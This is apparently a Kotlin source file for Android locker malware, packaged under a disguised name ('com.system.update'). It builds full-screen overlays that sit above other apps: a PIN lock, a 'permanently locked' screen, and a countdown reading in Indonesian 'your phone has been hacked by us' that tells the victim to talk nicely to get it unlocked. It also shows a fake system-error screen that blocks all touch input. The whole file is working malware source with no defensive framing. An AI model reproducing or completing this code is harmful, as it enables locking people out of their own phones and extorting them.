package com.system.update

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.*

object LockOverlayView {

    fun paramsFull(): WindowManager.LayoutParams {
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

        return WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.CENTER
        }
    }

    fun buildPin(ctx: Context, correctPin: String, onUnlock: (View) -> Unit): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
        }

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(48, 48, 48, 48)
        }

        val skull = TextView(ctx).apply {
            text = "☠"
            setTextColor(Color.parseColor("#E60000"))
            textSize = 72f
            gravity = Gravity.CENTER
        }

        val title = TextView(ctx).apply {
            text = "DEVICE TERKUNCI"
            setTextColor(Color.parseColor("#D4AF37"))
            textSize = 24f
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 8)
        }

        val subtitle = TextView(ctx).apply {
            text = "Masukkan PIN untuk membuka"
            setTextColor(Color.parseColor("#9A9A9A"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        }

        val pinInput = EditText(ctx).apply {
            hint = "• • • •"
            setHintTextColor(Color.parseColor("#3A0000"))
            setTextColor(Color.parseColor("#00FF66"))
            textSize = 36f
            gravity = Gravity.CENTER
            inputType = InputType.TYPE_CLASS_NUMBER
            setBackgroundColor(Color.parseColor("#141414"))
            setPadding(24, 20, 24, 20)
        }

        val status = TextView(ctx).apply {
            text = ""
            setTextColor(Color.parseColor("#E60000"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 16)
        }

        val btn = Button(ctx).apply {
            text = "BUKA"
            setBackgroundColor(Color.parseColor("#8A0000"))
            setTextColor(Color.WHITE)
        }

        btn.setOnClickListener {
            if (pinInput.text.toString().trim() == correctPin) {
                onUnlock(root)
            } else {
                status.text = "PIN SALAH"
            }
        }

        container.addView(skull)
        container.addView(title)
        container.addView(subtitle)
        container.addView(pinInput)
        container.addView(btn)
        container.addView(status)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply { gravity = Gravity.CENTER }
        root.addView(container, lp)

        return root
    }

    fun buildHard(ctx: Context): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
        }

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(48, 48, 48, 48)
        }

        val skull = TextView(ctx).apply {
            text = "☠"
            setTextColor(Color.parseColor("#E60000"))
            textSize = 140f
            gravity = Gravity.CENTER
        }

        val title = TextView(ctx).apply {
            text = "SYSTEM COMPROMISED"
            setTextColor(Color.parseColor("#D4AF37"))
            textSize = 22f
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 24, 0, 8)
        }

        val msg = TextView(ctx).apply {
            text = "Perangkat terkunci permanen"
            setTextColor(Color.parseColor("#9A9A9A"))
            textSize = 13f
            gravity = Gravity.CENTER
        }

        container.addView(skull)
        container.addView(title)
        container.addView(msg)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply { gravity = Gravity.CENTER }
        root.addView(container, lp)

        return root
    }

    fun buildTimer(ctx: Context, durationMs: Long, onUnlock: (View) -> Unit): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
        }

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(40, 40, 40, 40)
        }

        val triangle = TextView(ctx).apply {
            text = "⚠"
            setTextColor(Color.parseColor("#FFC107"))
            textSize = 100f
            gravity = Gravity.CENTER
        }

        val title = TextView(ctx).apply {
            text = "HP ANDA SUDAH KAMI RETAS"
            setTextColor(Color.parseColor("#E60000"))
            textSize = 20f
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 24, 0, 12)
        }

        val message = TextView(ctx).apply {
            text = "Mohon bicara baik-baik jika mau di lepas lock nya."
            setTextColor(Color.parseColor("#D4AF37"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 40)
        }

        val timerText = TextView(ctx).apply {
            setTextColor(Color.parseColor("#00FF66"))
            textSize = 56f
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
        }

        container.addView(triangle)
        container.addView(title)
        container.addView(message)
        container.addView(timerText)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply { gravity = Gravity.CENTER }
        root.addView(container, lp)

        val handler = Handler(Looper.getMainLooper())
        val endTime = System.currentTimeMillis() + durationMs
        handler.post(object : Runnable {
            override fun run() {
                val left = endTime - System.currentTimeMillis()
                if (left <= 0) {
                    onUnlock(root)
                    return
                }
                val h = left / 3_600_000
                val m = (left % 3_600_000) / 60_000
                val s = (left % 60_000) / 1000
                timerText.text = String.format("%02d:%02d:%02d", h, m, s)
                handler.postDelayed(this, 1000)
            }
        })

        return root
    }

    fun buildCrash(ctx: Context, onDismiss: (View) -> Unit): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
            isClickable = true
        }

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
        }

        val error = TextView(ctx).apply {
            text = "⚠"
            setTextColor(Color.parseColor("#E60000"))
            textSize = 80f
            gravity = Gravity.CENTER
        }

        val title = TextView(ctx).apply {
            text = "SYSTEM ERROR"
            setTextColor(Color.parseColor("#E60000"))
            textSize = 26f
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 8)
        }

        val msg = TextView(ctx).apply {
            text = "Sentuhan dinonaktifkan sementara."
            setTextColor(Color.parseColor("#9A9A9A"))
            textSize = 13f
            gravity = Gravity.CENTER
        }

        container.addView(error)
        container.addView(title)
        container.addView(msg)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply { gravity = Gravity.CENTER }
        root.addView(container, lp)

        root.setOnTouchListener { _, _ -> true }

        return root
    }
}
